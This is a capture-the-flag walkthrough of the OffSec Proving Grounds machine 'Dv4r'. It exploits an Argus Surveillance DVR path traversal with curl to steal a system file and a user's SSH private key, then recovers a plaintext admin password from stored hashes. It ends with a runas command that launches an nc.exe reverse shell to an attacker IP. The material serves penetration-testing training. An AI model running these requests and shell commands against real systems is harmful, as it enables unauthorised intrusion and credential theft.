# Dv4r — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Intermediate
**OS:** Windows

---

## TL;DR

Argus Surveillance DVR on port 8080 → EDB-45296 Path Traversal → Extract SSH key for user `viewer` → Extract hashed DVR admin passwords → Reverse engineer custom hash masking → Pivot via `runas` to Administrator.

---

## Enumeration

```bash
nmap -sV -p- 192.168.244.179
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | Bitvise WinSSHD 8.48 |
| 135,139,445| SMB/RPC | |
| 8080 | HTTP | Argus Surveillance DVR |

The key service is **Argus Surveillance DVR** running on port 8080.

---

## Exploitation — Path Traversal to SSH Key

A quick `searchsploit` for Argus reveals an unauthenticated directory traversal vulnerability ([EDB-45296](https://www.exploit-db.com/exploits/45296)).

We can test the path traversal via `curl`:
```bash
curl "http://192.168.244.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
```
This successfully leaks `system.ini`.

To escalate, we retrieve the SSH `.id_rsa` key for a presumed standard Windows user named `viewer` (commonly found in `C:\Users\viewer\.ssh\id_rsa` or similar).

```bash
curl "http://192.168.244.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusers%2Fviewer%2F.ssh%2Fid_rsa"
```
We get an OpenSSH private key!

**Logging in as viewer:**
```bash
chmod 400 id_rsa
ssh -i id_rsa viewer@192.168.244.179
```
We have a low privilege shell.

---

## Privilege Escalation — Hash Masking Logic Reversal

Argus stores its credentials in `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`.
Reading this file via SSH reveals two password hashes.

There is a known exploit ([EDB-50130](https://www.exploit-db.com/exploits/50130)) that includes logic to decrypt Argus hashes.
When attempting to decipher the second hash, it fails due to an unknown character encoding mapping in the algorithm.

To reverse-engineer the missing character mappings, we change the current Argus password using the web portal's administrative settings (which we can arbitrarily access via SSRF/Traversal or by creating a new account context), feeding it specific special characters:
```text
http://192.168.244.179:8080/USERS.CGI?USERNAME=Administrator&USERPASSWORD=$
```

By changing the password to individual special characters and checking the new hash output in `DVRParams.ini`, we map the unknown factors:
- `!` = `B398`
- `@` = `78A7`
- `#` = `<blank>`
- `$` = `D9A8`

Applying this custom logic back to the original hash decrypts the administrative credentials:
`14WatchD0g$`

With the administrative credentials, we can utilize `runas` to launch a reverse shell as the Administrator.

Transfer `nc.exe` to `C:\Users\viewer\` and execute over SSH:
```cmd
runas /env /profile /user:DVR4\Administrator "C:\Users\viewer\nc.exe -e cmd.exe 192.168.45.201 4444"
```
*(When prompted, enter the password `14WatchD0g$`).*

Listener catches the shell as **Administrator**! 🎉

---

## Key Takeaways

- **Path Traversal isn't just for `/etc/passwd`:** On Windows, grab `.ssh/id_rsa`, `sam`/`system` hives, or unencrypted config `.ini` files in `C:\ProgramData\`.
- **Reverse Engineering Black-Box Logic:** If a decryptor script fails on a customized hash, manually feed inputs (like special characters) to the application to determine the transformation mapping.
- **`runas` Command:** Native Windows binary for spawning processes as another user if you have their plaintext password. Highly effective.

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
